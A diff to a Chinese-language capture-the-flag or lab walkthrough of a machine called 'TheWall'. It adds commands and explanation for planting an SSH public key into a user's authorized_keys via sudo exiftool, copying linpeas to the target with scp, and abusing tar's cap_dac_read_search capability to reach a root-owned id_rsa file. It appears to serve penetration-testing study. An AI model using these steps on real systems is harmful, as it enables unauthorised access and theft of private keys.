@@ -119,6 +119,8 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjEN
 
 sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
 ```
+由于这是本地kali生成的公钥和私钥对，所以把公钥上传到靶机的/home/john/.ssh/authorized_keys就可以实现免密登录。
+
 
 [exiftool | GTFOBins](https://gtfobins.github.io/gtfobins/exiftool/#sudo)
 
@@ -143,9 +145,22 @@ cc5db5e7b0a26e807765f47a006f6221
 
 
 我已经使用**scp**将**Linpeas**复制到机器中，如下所示
-
+```c
+┌──(root㉿kali)-[~kali/桌面/OSCP]
+└─# scp linpeas.sh john@192.168.18.238:~
+```
 **豌豆**发现了这一点：
 ```c
 Files with capabilities (limited to 50):
 /usr/sbin/tar cap_dac_read_search=ep
 ```
+
+系统根目录下有一个属于**root的****id_rsa文件**
+```c
+john@TheWall:~$ ls -lah /
+```
+使用 CAP_DAC_READ_SEARCH，进程可以：
+
+- 读取系统上的任何文件，无论其权限如何。
+
+- 搜索（列出内容）系统上的任何目录，无论其权限如何。
